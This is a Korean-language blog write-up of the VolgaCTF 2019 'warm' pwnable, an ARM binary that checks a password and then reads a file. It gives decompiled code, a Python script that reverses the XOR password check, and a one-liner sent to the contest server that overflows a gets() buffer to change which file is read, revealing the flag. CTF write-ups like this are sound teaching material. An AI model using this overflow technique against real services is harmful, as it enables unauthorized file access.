---
layout: post
title: ! "[VolgaCTF 2019] warm Write-up "
excerpt_separator: <!--more-->
tags:
  - nalda
  - VolgaCTF 2019
  - Write-up
---

volgaCTF 2019 대회에 출제된 Pwnable인 warm문제
<!--more-->

volgaCTF 2019에서 출제된 warm이라는 문제이다!

먼저 파일을 확인해보면
```bash
nalda@nalda:~$ file warm 
warm: ELF 32-bit LSB shared object, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=c549628c0b3841a5fd9a23f0faaf6b51eb858e94, stripped
```
32bit ARM  Binary이다

먼저 IDA를 이용해 String을 확인했을 때,
```
LOAD:00000154	00000019	C	/lib/ld-linux-armhf.so.3
LOAD:0000033D	0000000A	C	libc.so.6
LOAD:00000347	00000005	C	gets
LOAD:0000034C	00000007	C	strcpy
LOAD:00000353	00000006	C	fopen
LOAD:00000359	00000005	C	puts
LOAD:0000035E	00000011	C	__stack_chk_fail
LOAD:0000036F	00000008	C	putchar
LOAD:00000377	00000006	C	abort
LOAD:0000037D	00000007	C	printf
LOAD:00000384	00000007	C	strlen
LOAD:0000038B	00000007	C	stdout
LOAD:00000392	00000007	C	fclose
LOAD:00000399	00000007	C	getenv
LOAD:000003A0	0000000F	C	__cxa_finalize
LOAD:000003AF	00000008	C	setvbuf
LOAD:000003B7	00000009	C	_IO_getc
LOAD:000003C0	00000012	C	__libc_start_main
LOAD:000003D2	00000014	C	ld-linux-armhf.so.3
LOAD:000003E6	00000012	C	__stack_chk_guard
LOAD:000003F8	0000000A	C	GLIBC_2.4
LOAD:00000402	0000001C	C	_ITM_deregisterTMCloneTable
LOAD:0000041E	0000000F	C	__gmon_start__
LOAD:0000042D	0000001A	C	_ITM_registerTMCloneTable
.rodata:00000B14	0000000A	C	FLAG_FILE
.rodata:00000B20	00000005	C	flag
.rodata:00000B28	00000017	C	Incorrect! Try again!\n
.rodata:00000B40	00000014	C	Unable to open file
.rodata:00000B54	0000001B	C	Unable to open %.*s file!\n
.rodata:00000B70	0000000E	C	Unknown error
.rodata:00000B80	0000002F	C	Hi there! I've been waiting for your password!
```

.rodata:00000B80영역에 
`Hi there! I've been waiting for your password!`라는 메시지가 있다는 사실을 알 수 있다.

```c
int sub_9EC()
{
  _IO_FILE *fp; // [sp+Ch] [bp+Ch]
  int c; // [sp+10h] [bp+10h]
  char v3[100]; // [sp+14h] [bp+14h]
  char v4[100]; // [sp+78h] [bp+78h]

  setvbuf((FILE *)stdout, 0, 2, 0);
  while ( 1 )
  {
    while ( 1 )
    {
      sub_8F0(&v4);
      puts("Hi there! I've been waiting for your password!");
      gets((char *)&v3);
      if ( !sub_788((const char *)&v3) )
        break;
      sub_978(1, 0);
    }
    fp = (_IO_FILE *)fopen((const char *)&v4, "rb");
    if ( fp )
      break;
    sub_978(2, &v4);
  }
  while ( 1 )
  {
    c = IO_getc(fp);
    if ( c == -1 )
      break;
    putchar(c);
  }
  fclose((FILE *)fp);
  return 0;
}
```

코드를 확인 해 보면 
1. `sub_8F0`함수를 통해 flag 파일을 읽어온다.
2. `v3`에 password를 받아온다
3. 입력받은 password는 `sub_788`함수에서 루틴을 체크한다.
4. 이를 통과하면, `v4`에 들어있는(2에서 반환된 값) file을 실행한다.
생각보다 간단한 프로그램이다 바로 `sub_788`의 내용을 확인해보자
```c
signed int __fastcall sub_788(const char *a1)
{
  char *s; // [sp+4h] [bp+4h]

  s = (char *)a1;
  if ( strlen(a1) <= 0xF )
    return 1;
  if ( (unsigned __int8)(*s ^ 0x23) != 85
    || (unsigned __int8)(s[1] ^ *s) != 78
    || (unsigned __int8)(s[2] ^ s[1]) != 30
    || (unsigned __int8)(s[3] ^ s[2]) != 21
    || (unsigned __int8)(s[4] ^ s[3]) != 94
    || (unsigned __int8)(s[5] ^ s[4]) != 28
    || (unsigned __int8)(s[6] ^ s[5]) != 33
    || (unsigned __int8)(s[7] ^ s[6]) != 1
    || (unsigned __int8)(s[8] ^ s[7]) != 52
    || (unsigned __int8)(s[9] ^ s[8]) != 7
    || (unsigned __int8)(s[10] ^ s[9]) != 53
    || (unsigned __int8)(s[11] ^ s[10]) != 17
    || (unsigned __int8)(s[12] ^ s[11]) != 55
    || (unsigned __int8)(s[13] ^ s[12]) != 60
    || (unsigned __int8)(s[14] ^ s[13]) != 114
    || (unsigned __int8)(s[15] ^ s[14]) != 71 )
  {
    return 2;
  }
  return 0;
}
```

생각보다 간단한 루틴체크이다.
각 조건별로 `(s[i] ^ s[i-1])`의 값과 !=로 뒤의값과 비교한다.
이 조건을 통해 python 코드를 작성했다.
```c
key = [ 85, 78, 30, 21, 94, 28, 33, 1, 52, 7, 53, 17, 55, 60, 114, 71 ]

passChar = 35

passwd = ""

for i in key:
    passChar = i ^ passChar
    passwd += chr(passChar)

print(passwd)
```


![]({{ site.baseurl }}/images/nalda/warm/1.png)

결과이다!
```
v8&3mqPQebWFqM?x
```

이 값을 입력하게 되면
```
Hi there! I've been waiting for your password!
v8&3mqPQebWFqM?x
Seek file with something more sacred!
```
라는 메시지가 나온당

뭔소린가 싶어서 고민을 했는데 뭔가 더 있단다

`sub_8F0`함수에서 환경변수로 저장된 flag 파일의 내용이 `Seek file with something more sacred!
`
서버가 닫혀 다른 write-up을 본 결과, `sacred`라는 파일을 읽으면 된다고 한다!


```python
python -c "print('v8&3mqPQebWFqM?x'+'A'*84+'sacred');" | nc warm.q.2019.volgactf.ru 443 
```

Flag is
```VolgaCTF{1_h0pe_ur_wARM_up_a_1ittle} ```
